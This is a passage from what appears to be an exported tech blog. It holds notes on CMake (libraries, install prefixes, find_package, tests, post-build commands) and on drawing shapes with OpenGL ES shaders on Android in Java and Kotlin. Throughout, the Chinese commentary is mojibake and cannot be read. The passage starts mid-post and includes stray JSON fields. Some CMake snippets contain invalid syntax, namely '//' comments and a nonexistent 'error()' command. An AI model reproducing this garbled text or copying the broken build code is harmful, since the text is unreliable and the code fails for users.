headerè¿™ä¸€ç‚¹ä¸Šï¼Œéƒ½æ²¡æœ‰åŒºåˆ«ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦æŠŠå¦ä¸€ä¸ªé¡¹ç›®é‡Œé¢çš„cppæ–‡ä»¶ä¹Ÿæ‹‰è¿›æ¥çš„è¯ï¼Œéœ€è¦add_subdirectory static libraryçš„å¤„ç†cmake_minimum_required(VERSION 3.5) project(hello_library) ############################################################ # Create a library ############################################################ #Generate the static library from the library sources add_library(hello_library STATIC src/Hello.cpp //åˆ›å»ºä¸€ä¸ªlibhello_library.a çš„static library ) target_include_directories(hello_library PUBLIC ${PROJECT_SOURCE_DIR}/include ) ############################################################ # Create an executable ############################################################ # Add an executable with the above sources add_executable(hello_binary src/main.cpp ) # link the new hello_library target with the hello_binary target target_link_libraries( hello_binary PRIVATE hello_library ) shared libraryçš„å¤„ç†cmake_minimum_required(VERSION 3.5) project(hello_library) ############################################################ # Create a library ############################################################ #Generate the shared library from the library sources add_library(hello_library SHARED src/Hello.cpp // ç”¨ä¼ å…¥è¯¥å‡½æ•°çš„æ–‡ä»¶åˆ›å»ºä¸€ä¸ª libhello_library.so Library ) add_library(hello::library ALIAS hello_library) target_include_directories(hello_library //hello_libraryéœ€è¦è¿™ä¸ªinclude directory PUBLIC ${PROJECT_SOURCE_DIR}/include ) ############################################################ # Create an executable ############################################################ # Add an executable with the above sources add_executable(hello_binary src/main.cpp ) # link the new hello_library target with the hello_binary target target_link_libraries( hello_binary // æ¥ä¸‹æ¥å°±æ˜¯Linkäº†ï¼Œè¿™é‡Œä½¿ç”¨äº†ä¸Šé¢çš„ä¸€ä¸ªalias PRIVATE hello::library ) æ¥ä¸‹æ¥æ˜¯make install (å°†ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å®‰è£…åˆ°ç³»ç»Ÿä¸­ï¼Œå°±æ˜¯å¤åˆ¶åˆ°CMAKE_INSTALL_PREFIXé‡Œé¢)CMAKE_INSTALL_PREFIXé»˜è®¤å€¼æ˜¯ usr/localsé»˜è®¤æƒ…å†µä¸‹cmakeä¼šæŠŠç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å®‰è£…åˆ°ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šå®‰è£…åˆ°ç‰¹å®šçš„ä½ç½®ï¼Œæ¨èæ–¹æ¡ˆæ˜¯æ”¾åˆ°ç”¨æˆ·ç›®å½•ä¸‹çš„.localæ–‡ä»¶å¤¹ä¸‹é¢cmake .. -DCMAKE_INSTALL_PREFIX=/install/location install (TARGETS cmake_examples_inst_bin DESTINATION bin) // target cmake_examples_inst_bin target to the destination ${CMAKE_INSTALL_PREFIX}/bin install (TARGETS cmake_examples_inst LIBRARY DESTINATION lib) //install the shared library generated from the target cmake_examples_inst target to the destination ${CMAKE_INSTALL_PREFIX}/lib æŸ¥æ‰¾ç³»ç»Ÿä¸­å·²å®‰è£…çš„libraryå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåœæ­¢ç¼–è¯‘è¿‡ç¨‹ find_package(Boost 1.66) # Check for libray, if found print message, include dirs and link libraries. if(Boost_FOUND) ## ç›´æ¥åˆ¤æ–­æ˜¯å¦æ‰¾åˆ° message(&quot;Boost Found&quot;) include_directories(${Boost_INCLUDE_DIRS}) target_link_libraries(cmake_hello ${Boost_LIBRARIES}) elseif(NOT Boost_FOUND) error(&quot;Boost Not Found&quot;) endif() ä¸å¸Œæœ›æŠŠsource treeæä¹± # Disable in-source builds to prevent source tree corruption. if(&quot; ${CMAKE_SOURCE_DIR}&quot; STREQUAL &quot; ${CMAKE_BINARY_DIR}&quot;) message(FATAL_ERROR &quot; FATAL: In-source builds are not allowed. You should create a separate directory for build files. &quot;) endif() é€šè¿‡cmakeè¿è¡Œtestï¼Œä¾‹å¦‚make testmake test project (TextMining) enable_testing() //è¿™ä¸€å¥ä¸€å®šè¦æ”¾åœ¨æœ€å¤–é¢çš„CMakeList.txté‡Œé¢ set_tests_properties(TestProgram1 PROPERTIES DEPENDS TestProgram2) //ç”šè‡³å¯ä»¥è¦æ±‚TestProgram2å…ˆè·‘ï¼Œè·‘å®Œå†è·‘TestProgram1 cmake è¿˜å¯ä»¥åŠ è‡ªå®šä¹‰commandä¾‹å¦‚åœ¨æŸä¸€ä¸ªtargetçš„post buildä¹‹åæŠŠç”Ÿæˆçš„äº§ç‰©copyåˆ°æŸä¸ªä½ç½® add_library(gmath STATIC src/gmath.c) # copy out the lib binary... need to leave the static lib around to pass gradle check set(distribution_DIR ${CMAKE_CURRENT_SOURCE_DIR}/../../../../../distribution) set_target_properties(gmath PROPERTIES ARCHIVE_OUTPUT_DIRECTORY &quot;${distribution_DIR}/gmath/lib/${ANDROID_ABI}&quot;) # copy out lib header file... add_custom_command(TARGET gmath POST_BUILD COMMAND &quot;${CMAKE_COMMAND}&quot; -E copy &quot;${CMAKE_CURRENT_SOURCE_DIR}/src/gmath.h&quot; &quot;${distribution_DIR}/gmath/include/gmath.h&quot; # **** the following 2 lines are for potential future debug purpose **** # COMMAND &quot;${CMAKE_COMMAND}&quot; -E # remove_directory &quot;${CMAKE_CURRENT_BINARY_DIR}&quot; COMMENT &quot;Copying gmath to output directory&quot;) çœ‹çœ‹ä¸€äº›å¼€æºé¡¹ç›®çš„CMakeLists.txtæ˜¯æ€ä¹ˆå†™çš„,çœ‹çœ‹å®é™…é¡¹ç›®æ¯”çœ‹æ–‡æ¡£å¿«ç‚¹cJSONå¤šä¸ªsourceæ–‡ä»¶å¤¹çš„é—®é¢˜ å®é™…å·¥ç¨‹ä¸­å¯èƒ½source directoryæˆ–è€…library directoryæœ‰å¤šä¸ªï¼Œè¿™æ—¶å¾€å¾€ä¼šåœ¨æ¯ä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶å¤¹é‡Œé¢éƒ½çœ‹åˆ°ä¸€ä¸ªCMakeLists.txtæ–‡ä»¶ï¼Œè¿™ä¸ªæ‰æ˜¯å·¥ç¨‹ä¸­å®é™…ä½¿ç”¨çš„ã€‚æ¯ä¸€ä¸ªCMakeLists.txtéƒ½æŒ‡æ˜äº†è‡ªå·±æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­æ–‡ä»¶çš„å…³ç³»ï¼Œè½»æ˜“ä¸è¦çæ”¹ã€‚ ä¾‹å¦‚è¿™æ ·ä¸€ä¸ªç”Ÿæˆå¤šä¸ªTargetçš„é¡¹ç›® å†ä¾‹å¦‚ssçš„CMakeList.txt json-cçš„cmake .cmakeåç¼€çš„æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯è¿™ä¹ˆç”¨çš„ï¼š cmake -H. -B_build -DCMAKE_TOOLCHAIN_FILE=&quot;${PWD}/toolchains/gcc.cmake&quot; cmake /path/to/src -DCMAKE_TOOLCHAIN_FILE=/path/to/toolchain/foo-bar-baz.cmake æ€»ç»“ è¿™ä¸ªrepoæ€»ç»“äº†å„ç§å„æ ·çš„åœºæ™¯ï¼Œä¾‹å¦‚ç¼–è¯‘å•ä¸ªbinaryï¼Œç¼–è¯‘libraryï¼Œlinkç¬¬ä¸‰æ–¹libraryï¼Œè°ƒæ•´linkerå‚æ•°ã€‚ã€‚ã€‚ã€‚éœ€è¦çš„æ—¶å€™ç…§ç€è¿™ä¸ªå†™å°±æ˜¯äº† è‡ªå·±å‚ç…§ç€ä»‹ç»äº†build app, build libraryä»¥åŠlink_libraryçš„åŸºæœ¬æ“ä½œå†™äº†å‡ ä¸ªexampleï¼Œåˆ†åˆ«æ˜¯build binaryï¼Œbuild library å’Œlink libraryï¼Œåˆ†åˆ«cdåˆ°å¯¹åº”æ–‡ä»¶å¤¹ä¸‹é¢è¿è¡Œshellè„šæœ¬å°±è¡Œäº† cmake .. ä¼šå¯¼è‡´installåˆ°/usr/libé‡Œé¢ï¼Œ æˆ‘ä¸ªäººä¸æ˜¯å¾ˆå–œæ¬¢è¿™ç§æŠŠç³»ç»Ÿç›®å½•å¼„ä¹±çš„æ–¹å¼ã€‚è¿˜æ˜¯cmake -DCMAKE_INSTALL_PREFIX=../installã€‚ è¿™åªæ˜¯ä¸ªå·¥å…·ï¼Œæˆ‘çŸ¥é“éœ€è¦çš„æ—¶å€™å»å“ªé‡ŒæŸ¥èµ„æ–™,è¿™å°±è¶³å¤Ÿäº† å‚è€ƒä»‹ç»äº†å¾ˆå¤šçš„å†…ç½®å˜é‡ æ¯”è¾ƒé•¿ï¼Œè¯è¯´è¿™äº›å˜é‡éœ€è¦çš„æ—¶å€™å†æŸ¥ä¹Ÿä¸æ˜¯ä¸è¡Œcmake 2020å¹´æ›´æ–° ä¸æ˜¯å¾ˆæ¨èï¼Œå¤ªæ·±å±‚æ¬¡äº†ã€‚","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"C","slug":"C","permalink":"https://haldir65.github.io/tags/C/"}]},{"title":"openglå­¦ä¹ ç¬”è®°","date":"2018-11-15T22:53:55.000Z","path":"2018/11/15/2018-11-15-opengl-related-topics/","text":"topics relating opengl stuff æœ¬æ–‡å¤šæ•°ä»£ç æ¥è‡ªè¿™ä¸ªç³»åˆ— é¦–å…ˆï¼Œä¸è¦å­¦æ—§çš„ç‰ˆæœ¬ã€‚It is much better to start from the â€œmodernâ€ OpenGL versions: Learn OpenGL &gt;3.0. opengl device support on android OpenGL ES 1.0 &amp; 1.1 since Android 1.0 (API 4) OpenGL ES 2.0 since Android 2.2 (API 8) OpenGL ES 3.0 since Android 4.3 (API 18) (almost) OpenGL ES 3.1 since Android 5.0 (API 21) OpenGL ES is a variant of OpenGLâ€™s specifications for embedded system. Graphics progamming for OpenGL ES 2.0 and 3.0 is largely similar, with version 3.0 representing a superset of the 2.0 API with additional features. Programming for the OpenGL ES 1.0/1.1 API versus OpenGL ES 2.0 and 3.0 differs significantly(2.0å’Œ3.0çš„è¯­æ³•å·®ä¸å¤šï¼Œ3.0å°±æ˜¯åŠ äº†ç‚¹ç‰¹æ€§ã€‚1.0å’Œä»–ä¿©çš„è¯­æ³•ä¸åŒï¼Œä¸è¦å­¦)æ€»çš„æ¥è®²ï¼Œ2.0å’Œ3.0è¦æ¯”1.0çš„æ€§èƒ½å¥½ï¼Œèƒ½å¤Ÿå¯¹ç¡¬ä»¶æœ‰æ›´è‡ªç”±çš„æŒæ§ï¼ˆthe API provides a great deal of control over the graphics rendering pipeline.ï¼‰ï¼Œä½†æ˜¯è¯­æ³•è¦å¤æ‚äº›ã€‚ Androidæä¾›äº†å¾ˆå¤šç”¨äºå’ŒOPENGLç¯å¢ƒäº¤äº’çš„classå¼€å‘è€…ä½¿ç”¨javaç¯å¢ƒ -&gt; æè¿°ç»˜åˆ¶å›¾å½¢ -&gt; graphics rendering pipelineæœ€ç®€å•çš„Viewæ˜¯GLSurfaceViewï¼Œå®ç°æ¸²æŸ“çš„é€»è¾‘åœ¨GLSurfaceView.Rendererä¸­ã€‚å¦‚æœæƒ³è¦åªåœ¨viewçš„å¸ƒå±€ä¸€éƒ¨åˆ†ä¸­ä½¿ç”¨glåŠŸèƒ½çš„è¯·ä½¿ç”¨TextureViewï¼ŒFor real, do-it-yourself developers, it is also possible to build up an OpenGL ES view using SurfaceView, but this requires writing quite a bit of additional codeã€‚ GLSurfaceView.Renderer public interface Renderer { void onSurfaceCreated(GL10 gl, EGLConfig config); void onSurfaceChanged(GL10 gl, int width, int height); void onDrawFrame(GL10 gl); } renderå°±è¿™ä¹ˆä¸‰ä¸ªæ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•éƒ½åœ¨ä¸€æ¡å«åšGLThreadçš„çº¿ç¨‹ä¸Šè¢«è°ƒç”¨ æ£€æŸ¥å½“å‰è®¾å¤‡çš„openglesç‰ˆæœ¬:åœ¨GLSurfaceView.Rendererçš„onSurfaceCreatedä¸­æ·»åŠ  // Create a minimum supported OpenGL ES context, then check: String version = gl.glGetString(GL10.GL_VERSION); Log.w(TAG, &quot;Version: &quot; + version ); // The version format is displayed as: &quot;OpenGL ES &lt;major&gt;.&lt;minor&gt;&quot; // followed by optional content provided by the implementation. æˆ‘åœ¨ä¸€å°5.1çš„è®¾å¤‡ä¸Šæ‰“å°å‡ºæ¥çš„æ˜¯â€OpenGL ES 3.1â€è¿™ä¹ˆå‡ ä¸ªå­—ã€‚ åæ ‡ç³» By default, OpenGL ES assumes a coordinate system where [0,0,0] (X,Y,Z) specifies the center of the GLSurfaceView frame, [1,1,0] is the top right corner of the frame and [-1,-1,0] is bottom left corner of the frameopenglä½¿ç”¨ä¸‰ç»´åæ ‡ç³»ï¼Œå³æ‰‹åæ ‡ï¼Œå±å¹•ä¸­å¿ƒä¸ºåŸç‚¹ï¼Œzè½´å‚ç›´äºå±å¹•ï¼Œå¾€ä¸Šæ˜¯æ­£æ•°ã€‚å±å¹•ä¸­å¿ƒå¾€å³èµ°æ˜¯xè½´æ­£è½´ï¼Œå±å¹•ä¸­å¿ƒå¾€ä¸Šèµ°æ˜¯yè½´æ­£è½´ã€‚ cullingï¼ˆå°±æ˜¯å‘Šè¯‰openglå®Œå…¨å¿½ç•¥æ‰èƒŒé¢ï¼Œä¸è¦æµªè´¹æ—¶é—´å»æ¸²æŸ“çœ‹ä¸è§çš„åœ°æ–¹ï¼‰Face culling is an option for the OpenGL environment which allows the rendering pipeline to ignore (not calculate or draw) the back face of a shape, saving time, memory and processing cycles:ï¼ˆå¥½å¤„å°±æ˜¯èŠ‚çœæ—¶é—´å’Œè¿ç®—é‡ï¼‰æ¯”æ–¹è¯´å®Œå…¨å¿½ç•¥æ‰èƒŒé¢ // enable face culling feature gl.glEnable(GL10.GL_CULL_FACE); // specify which faces to not draw gl.glCullFace(GL10.GL_BACK); è¿˜æœ‰ï¼Œé»˜è®¤çš„ä½œå›¾é¡ºåºæ˜¯é€†æ—¶é’ˆçš„ Texture compressionèƒ½å¤Ÿæå¤§çš„èŠ‚çº¦å†…å­˜ï¼Œå¹¶å……åˆ†åˆ©ç”¨å†…å­˜å¸¦å®½æå‡æ€§èƒ½åŒ…æ‹¬è¿™ä¹ˆå‡ ä¸ª:ETC1 compression format(ä½†ä¸æ”¯æŒæœ‰alpha channelï¼Œå°±æ˜¯å¸¦é€æ˜åº¦çš„)The ETC2/EAC texture compression formats (æ”¯æŒå¸¦alpha channel) æŸ¥çœ‹å½“å‰è®¾å¤‡æ”¯æŒçš„OpenGL extensions(entensionå°±æ˜¯æ ‡å‡†ä¹‹å¤–çš„ï¼Œéƒ¨åˆ†å‚å•†ç¡¬ä»¶æ”¯æŒçš„ç‰¹æ€§) // Get the list of extensions. String extensionList = GLES10.glGetString(GLES10.GL_EXTENSIONS); if (!TextUtils.isEmpty(extensionList)) { // The list of extensions comes from the driver separated by spaces. // Split them apart and add them into a Set for deduping purposes. for (String extension : extensionList.split(&quot; &quot;)) { glExtensions.add(extension); } } OpenGL ES 2.0è¿‡ç¨‹åŠç†è§£OpenGL ES 2.0æ¸²æŸ“è¿‡ç¨‹ä¸ºï¼šè¯»å–é¡¶ç‚¹æ•°æ®â€”â€”æ‰§è¡Œé¡¶ç‚¹ç€è‰²å™¨â€”â€”ç»„è£…å›¾å…ƒâ€”â€”å…‰æ …åŒ–å›¾å…ƒâ€”â€”æ‰§è¡Œç‰‡å…ƒç€è‰²å™¨â€”â€”å†™å…¥å¸§ç¼“å†²åŒºâ€”â€”æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚OpenGLä½œä¸ºæœ¬åœ°åº“ç›´æ¥è¿è¡Œåœ¨ç¡¬ä»¶ä¸Šï¼Œæ²¡æœ‰è™šæ‹Ÿæœºï¼Œä¹Ÿæ²¡æœ‰åƒåœ¾å›æ”¶æˆ–è€…å†…å­˜å‹ç¼©ã€‚åœ¨Javaå±‚å®šä¹‰å›¾åƒçš„æ•°æ®éœ€è¦èƒ½è¢«OpenGLå­˜å–ï¼Œå› æ­¤ï¼Œéœ€è¦æŠŠå†…å­˜ä»Javaå †å¤åˆ¶åˆ°æœ¬åœ°å †ã€‚é¡¶ç‚¹ç€è‰²å™¨æ˜¯é’ˆå¯¹æ¯ä¸ªé¡¶ç‚¹éƒ½ä¼šæ‰§è¡Œçš„ç¨‹åºï¼Œæ˜¯ç¡®å®šæ¯ä¸ªé¡¶ç‚¹çš„ä½ç½®ã€‚åŒç†ï¼Œç‰‡å…ƒç€è‰²å™¨æ˜¯é’ˆå¯¹æ¯ä¸ªç‰‡å…ƒéƒ½ä¼šæ‰§è¡Œçš„ç¨‹åºï¼Œç¡®å®šæ¯ä¸ªç‰‡å…ƒçš„é¢œè‰²ã€‚ç€è‰²å™¨éœ€è¦è¿›è¡Œç¼–è¯‘ï¼Œç„¶åé“¾æ¥åˆ°OpenGLç¨‹åºä¸­ã€‚ä¸€ä¸ªOpenGLçš„ç¨‹åºå°±æ˜¯æŠŠä¸€ä¸ªé¡¶ç‚¹ç€è‰²å™¨å’Œä¸€ä¸ªç‰‡æ®µç€è‰²å™¨é“¾æ¥åœ¨ä¸€èµ·å˜æˆå•ä¸ªå¯¹è±¡ã€‚ å®šä¹‰shapeç‚¹ï¼Œçº¿ï¼Œä¸‰è§’å½¢ï¼Œè¿™ä¸‰ä¸ªæ˜¯openglçš„å›¾å½¢åŸºç¡€ï¼Œå…¶ä»–ä»»ä½•é›†åˆå›¾å½¢éƒ½å¯ä»¥ç”¨ä¸‰è§’å½¢æ‹¼å‡‘å‡ºæ¥ã€‚æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œå¼€å‘è€…éœ€è¦å¾€openglä¼ ä¸€ä¸ªfloatçš„arrayä½œä¸ºè¦ç»˜åˆ¶çš„å¯¹è±¡çš„åæ ‡ï¼Œåœ¨javaé‡Œç”¨ArrayBufferæ¯”è¾ƒå¥½(è¿™éƒ¨åˆ†å†…å­˜æ˜¯ä¼ åˆ°ç¡¬ä»¶å±‚çš„)ã€‚å®˜æ–¹æ–‡æ¡£ä¸Šè¿™æ ·å®šä¹‰äº†ä¸€ä¸ªä¸‰è§’å½¢ public class Triangle { private FloatBuffer vertexBuffer; // number of coordinates per vertex in this array static final int COORDS_PER_VERTEX = 3; static float triangleCoords[] = { // in counterclockwise order: 0.0f, 0.622008459f, 0.0f, // top -0.5f, -0.311004243f, 0.0f, // bottom left 0.5f, -0.311004243f, 0.0f // bottom right }; //é€†æ—¶é’ˆèµ°å‘ // Set color with red, green, blue and alpha (opacity) values float color[] = { 0.63671875f, 0.76953125f, 0.22265625f, 1.0f }; public Triangle() { // initialize vertex byte buffer for shape coordinates ByteBuffer bb = ByteBuffer.allocateDirect( // (number of coordinate values * 4 bytes per float) triangleCoords.length * 4); // use the device hardware&#39;s native byte order bb.order(ByteOrder.nativeOrder()); //å­—èŠ‚åº // create a floating point buffer from the ByteBuffer vertexBuffer = bb.asFloatBuffer(); // add the coordinates to the FloatBuffer vertexBuffer.put(triangleCoords); // set the buffer to read the first coordinate vertexBuffer.position(0); } } æ­£æ–¹å½¢å°±å¯ä»¥ç”±ä¸¤ä¸ªä¸‰è§’å½¢æ‹¼åœ¨ä¸€èµ·ç»„æˆ public class Square { private FloatBuffer vertexBuffer; private ShortBuffer drawListBuffer; // number of coordinates per vertex in this array static final int COORDS_PER_VERTEX = 3; static float squareCoords[] = { -0.5f, 0.5f, 0.0f, // top left -0.5f, -0.5f, 0.0f, // bottom left 0.5f, -0.5f, 0.0f, // bottom right 0.5f, 0.5f, 0.0f }; // top right private short drawOrder[] = { 0, 1, 2, 0, 2, 3 }; // order to draw vertices public Square() { // initialize vertex byte buffer for shape coordinates ByteBuffer bb = ByteBuffer.allocateDirect( // (# of coordinate values * 4 bytes per float) squareCoords.length * 4); bb.order(ByteOrder.nativeOrder()); vertexBuffer = bb.asFloatBuffer(); vertexBuffer.put(squareCoords); vertexBuffer.position(0); // initialize byte buffer for the draw list ByteBuffer dlb = ByteBuffer.allocateDirect( // (# of coordinate values * 2 bytes per short) drawOrder.length * 2); dlb.order(ByteOrder.nativeOrder()); drawListBuffer = dlb.asShortBuffer(); drawListBuffer.put(drawOrder); drawListBuffer.position(0); } } ç»˜åˆ¶å®šä¹‰çš„shapeé¦–å…ˆåœ¨onSurfaceCreatedé‡Œé¢åˆ›å»ºè¦ç»˜åˆ¶çš„shapeå¯¹è±¡ private Triangle mTriangle; private Square mSquare; public void onSurfaceCreated(GL10 unused, EGLConfig config) { ... // initialize a triangle mTriangle = new Triangle(); // initialize a square mSquare = new Square(); } æ¥ä¸‹æ¥å°±æ˜¯æ¯”è¾ƒéº»çƒ¦çš„åœ°æ–¹äº†ï¼Œå¿…é¡»è¦å®šä¹‰è¿™å‡ æ ·ä¸œè¥¿ Vertex Shader - OpenGL ES graphics code for rendering the vertices of a shape.ï¼ˆé¡¶ç‚¹ç€è‰²å™¨ï¼‰ Fragment Shader - OpenGL ES code for rendering the face of a shape with colors or textures.(ç‰‡å…ƒç€è‰²å™¨) Program - An OpenGL ES object that contains the shaders you want to use for drawing one or more shapes. è‡³å°‘éœ€è¦ä¸€ä¸ªvertex shaderå»ç”»shapeï¼Œä¸€ä¸ªfragment shaderå»ç”»shapeçš„é¢œè‰²ï¼Œè¿™ä¿©è¢«ç¼–è¯‘å¹¶æ·»åŠ åˆ°opengles programä¸­ï¼Œåè€…å°†è¢«ç”¨æ¥ç”»è¿™ä¸ªshape public class Triangle { private final String vertexShaderCode = &quot;attribute vec4 vPosition;&quot; + &quot;void main() {&quot; + &quot; gl_Position = vPosition;&quot; + &quot;}&quot;; private final String fragmentShaderCode = &quot;precision mediump float;&quot; + &quot;uniform vec4 vColor;&quot; + &quot;void main() {&quot; + &quot; gl_FragColor = vColor;&quot; + &quot;}&quot;; ... } public static int loadShader(int type, String shaderCode){ // create a vertex shader type (GLES20.GL_VERTEX_SHADER) // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER) int shader = GLES20.glCreateShader(type); // add the source code to the shader and compile it GLES20.glShaderSource(shader, shaderCode); GLES20.glCompileShader(shader); //ç¼–è¯‘shaderå¹¶link programå¾ˆè€—è´¹cpuï¼Œæ‰€ä»¥åªè¦åšä¸€æ¬¡ï¼Œä¸€èˆ¬æ”¾åœ¨shapeçš„æ„é€ å‡½æ•°é‡Œé¢ return shader; } æ‰€ä»¥æœ€åTriangleçš„ä»£ç å˜æˆè¿™æ · // number of coordinates per vertex in this array const val COORDS_PER_VERTEX = 3 var triangleCoords = floatArrayOf( // in counterclockwise order: 0.0f, 0.622008459f, 0.0f, // top -0.5f, -0.311004243f, 0.0f, // bottom left 0.5f, -0.311004243f, 0.0f // bottom right ) class Triangle { // Set color with red, green, blue and alpha (opacity) values val color = floatArrayOf(0.63671875f, 0.76953125f, 0.22265625f, 1.0f) private var vertexBuffer: FloatBuffer = // (number of coordinate values * 4 bytes per float) ByteBuffer.allocateDirect(triangleCoords.size * 4).run { // use the device hardware&#39;s native byte order order(ByteOrder.nativeOrder()) // create a floating point buffer from the ByteBuffer asFloatBuffer().apply { // add the coordinates to the FloatBuffer put(triangleCoords) // set the buffer to read the first coordinate position(0) } } private var mProgram: Int private val vertexShaderCode = &quot;attribute vec4 vPosition;&quot; + &quot;void main() {&quot; + &quot; gl_Position = vPosition;&quot; + &quot;}&quot; private val fragmentShaderCode = &quot;precision mediump float;&quot; + &quot;uniform vec4 vColor;&quot; + &quot;void main() {&quot; + &quot; gl_FragColor = vColor;&quot; + &quot;}&quot; private val vertexCount: Int = triangleCoords.size / COORDS_PER_VERTEX private val vertexStride: Int = COORDS_PER_VERTEX * 4 // 4 bytes per vertex init { val vertexShader: Int = loadShader(GLES20.GL_VERTEX_SHADER, vertexShaderCode) val fragmentShader: Int = loadShader(GLES20.GL_FRAGMENT_SHADER, fragmentShaderCode) // create empty OpenGL ES Program mProgram = GLES20.glCreateProgram().also { // add the vertex shader to program GLES20.glAttachShader(it, vertexShader) // add the fragment shader to program GLES20.glAttachShader(it, fragmentShader) // creates OpenGL ES program executables GLES20.glLinkProgram(it) } } private var mPositionHandle: Int = 0 private var mColorHandle: Int = 0 fun loadShader(type: Int, shaderCode: String): Int { // create a vertex shader type (GLES20.GL_VERTEX_SHADER) // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER) return GLES20.glCreateShader(type).also { shader -&gt; // add the source code to the shader and compile it GLES20.glShaderSource(shader, shaderCode) GLES20.glCompileShader(shader) } } fun draw() { // Add program to OpenGL ES environment GLES20.glUseProgram(mProgram) // get handle to vertex shader&#39;s vPosition member mPositionHandle = GLES20.glGetAttribLocation(mProgram, &quot;vPosition&quot;).also { // Enable a handle to the triangle vertices GLES20.glEnableVertexAttribArray(it) // Prepare the triangle coordinate data GLES20.glVertexAttribPointer( it, COORDS_PER_VERTEX, GLES20.GL_FLOAT, false, vertexStride, vertexBuffer ) // get handle to fragment shader&#39;s vColor member mColorHandle = GLES20.glGetUniformLocation(mProgram, &quot;vColor&quot;).also { colorHandle -&gt; // Set color for drawing the triangle GLES20.glUniform4fv(colorHandle, 1, color, 0) } // Draw the triangle GLES20.glDrawArrays(GLES20.GL_TRIANGLES, 0, vertexCount) // Disable vertex array GLES20.glDisableVertexAttribArray(it) } } } æ¥ä¸‹æ¥æ˜¯ Apply projection and camera viewsProjection å°±æ˜¯æ ¹æ®è®¾å¤‡çš„å®é™…å±å¹•å°ºå¯¸è°ƒèŠ‚ç»˜åˆ¶åæ ‡Camera View å°±æ˜¯æ ¹æ®ä¸€ä¸ªå‡æƒ³çš„cameraè§†è§’è°ƒèŠ‚åæ ‡ ç€è‰²å™¨è¯­è¨€GLSLå†™åˆ°è¿™é‡Œï¼ŒåŸºæœ¬çš„æµç¨‹å°±æ˜¯åœ¨onSurfaceCreatedä¸­å»loadShaderï¼Œè€ŒshaderCodeä¸€èˆ¬æ˜¯è¿™æ ·çš„ã€‚ uniform mat4 vMatrix; varying vec4 vColor; attribute vec4 vPosition; void main(){ gl_Position=vMatrix*vPosition; if(vPosition.z!=0.0){ vColor=vec4(0.0,0.0,0.0,1.0); }else{ vColor=vec4(0.9,0.9,0.9,1.0); } } è¿™æ˜¯ä¸€é—¨é«˜çº§çš„å›¾å½¢åŒ–ç¼–ç¨‹è¯­è¨€ï¼Œå…¶æºäºåº”ç”¨å¹¿æ³›çš„Cè¯­è¨€ï¼Œä¸»è¦ç‰¹æ€§åŒ…æ‹¬: GLSLæ˜¯ä¸€ç§é¢å‘è¿‡ç¨‹çš„è¯­è¨€ï¼Œå’ŒJavaçš„é¢å‘å¯¹è±¡æ˜¯ä¸åŒçš„ã€‚ GLSLçš„åŸºæœ¬è¯­æ³•ä¸C/C++åŸºæœ¬ç›¸åŒã€‚ å®ƒå®Œç¾çš„æ”¯æŒå‘é‡å’ŒçŸ©é˜µæ“ä½œã€‚ å®ƒæ˜¯é€šè¿‡é™å®šç¬¦æ“ä½œæ¥ç®¡ç†è¾“å…¥è¾“å‡ºç±»å‹çš„ã€‚ GLSLæä¾›äº†å¤§é‡çš„å†…ç½®å‡½æ•°æ¥æä¾›ä¸°å¯Œçš„æ‰©å±•åŠŸèƒ½ã€‚ é¡¶ç‚¹ç€è‰²å™¨çš„å†…å»ºå˜é‡gl_Positionï¼šé¡¶ç‚¹åæ ‡gl_PointSizeï¼šç‚¹çš„å¤§å°ï¼Œæ²¡æœ‰èµ‹å€¼åˆ™ä¸ºé»˜è®¤å€¼1ï¼Œé€šå¸¸è®¾ç½®ç»˜å›¾ä¸ºç‚¹ç»˜åˆ¶æ‰æœ‰æ„ä¹‰ã€‚ ç‰‡å…ƒç€è‰²å™¨çš„å†…å»ºå˜é‡è¾“å…¥å˜é‡gl_FragCoordï¼šå½“å‰ç‰‡å…ƒç›¸å¯¹çª—å£ä½ç½®æ‰€å¤„çš„åæ ‡ã€‚gl_FragFacingï¼šboolå‹ï¼Œè¡¨ç¤ºæ˜¯å¦ä¸ºå±äºå…‰æ …åŒ–ç”Ÿæˆæ­¤ç‰‡å…ƒçš„å¯¹åº”å›¾å…ƒçš„æ­£é¢ã€‚è¾“å‡ºå˜é‡gl_FragColorï¼šå½“å‰ç‰‡å…ƒé¢œè‰²gl_FragDataï¼švec4ç±»å‹çš„æ•°ç»„ã€‚å‘å…¶å†™å…¥çš„ä¿¡æ¯ï¼Œä¾›æ¸²æŸ“ç®¡çº¿çš„åç»§è¿‡ç¨‹ä½¿ç”¨ã€‚ å†…ç½®å‡½æ•°:çº¹ç†é‡‡æ ·å‡½æ•°çº¹ç†é‡‡æ ·å‡½æ•°æœ‰texture2Dã€texture2DProjã€texture2DLodã€texture2DProjLodã€textureCubeã€textureCubeLodåŠtexture3Dã€texture3DProjã€texture3DLodã€texture3DProjLodç­‰ã€‚ å‘é‡åœ¨GPUä¸­ç”±ç¡¬ä»¶æ”¯æŒè¿ç®—ï¼Œæ¯”CPUå¿«çš„å¤šã€‚æ€»çš„æ¥è¯´è¿™é—¨è¯­è¨€è¦æ¯”å…¶ä»–ç¼–ç¨‹è¯­è¨€ç®€å•äº› ç”¨OpenGL ESæ˜¾ç¤ºå›¾ç‰‡çº¹ç†(texture):åœ¨ç†è§£çº¹ç†æ˜ å°„æ—¶ï¼Œå¯ä»¥å°†çº¹ç†çœ‹åšåº”ç”¨åœ¨ç‰©ä½“è¡¨é¢çš„åƒç´ 